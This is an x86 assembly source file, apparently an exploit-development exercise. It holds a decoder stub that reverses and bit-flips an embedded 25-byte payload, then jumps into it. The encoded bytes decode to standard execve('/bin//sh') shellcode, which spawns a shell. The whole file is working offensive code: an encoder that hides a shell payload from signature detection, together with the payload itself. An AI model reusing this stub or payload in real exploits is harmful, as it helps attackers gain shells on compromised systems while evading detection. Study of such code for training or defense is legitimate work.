; Purpose: decode an encoded(see compiler.rb) shellcode
global _start

section .text
  LENGTH equ 25

_start:
  jmp short call_shellcode    ; jump to call_shellcode

decoder:
  pop esi                      ; esi = address of the Shellcode
  xor ecx, ecx                 ; clear ecx
  xor ebx, ebx                 ; clear ebx
  mul ecx                      ; clear eax and edx
  mov cl, LENGTH - 1           ; cl = length - 1 for loop (reverse)

reverse:                       ; reverse the arrangement of the Shellcode bytes
  xchg al, byte [esi + edx]    ; al = value of the shellcode using edx as index
  xchg bl, byte [esi + ecx]    ; bl = value of the shellcode using ecx as index
  xchg bl, al                  ; exchange the values of al and bl
  xchg al, byte [esi + edx]    ; move the value of ecx index into edx index
  xchg bl, byte [esi + ecx]    ; move the value of edx index into ecx index
  inc edx                      ; edx + 1 to move in index index
  dec ecx                      ; ecx - 1 to move in previous index
  cmp dl, LENGTH/2             ; stop the loop if the first and second half of shellcode already interchanged
  jnz reverse                  ; if not, continue the loop(reverse)

decode:                        ; subtract 1 for even and add 1 for odd
  mov al, byte [esi + ebx]     ; run through every byte of the Shellcode
  test al, 1                   ; check if current byte is an odd. Source: https://www.felixcloutier.com/x86/test and https://stackoverflow.com/questions/49116747/assembly-check-if-number-is-even/49116885
  jnz subtract                 ; if odd, subtract 1
  inc al                       ; if even, add 1

decode_:
  mov byte [esi + ebx], al     ; move new value into the current Shellcode byte
  inc ebx                      ; decode the next byte
  cmp ebx, LENGTH              ; stop the loop if all bytes are decoded
  jnz decode                   ; otherwise, continue the loop(decode)
  jz short Shellcode           ; jump to the Shellcode once it is decoded

subtract:                      ; subtract 1
  dec al
  jmp short decode_

call_shellcode:
  call decoder                 ; jump to decoder and push the Shellcode into the stack
  Shellcode: db 0x81,0xcc,0xa,0xb1,0xe0,0x88,0x52,0xe3,0x88,0x51,0xe2,0x88,0x6f,0x68,0x63,0x2e,0x69,0x69,0x72,0x2e,0x2e,0x69,0x51,0xc1,0x30
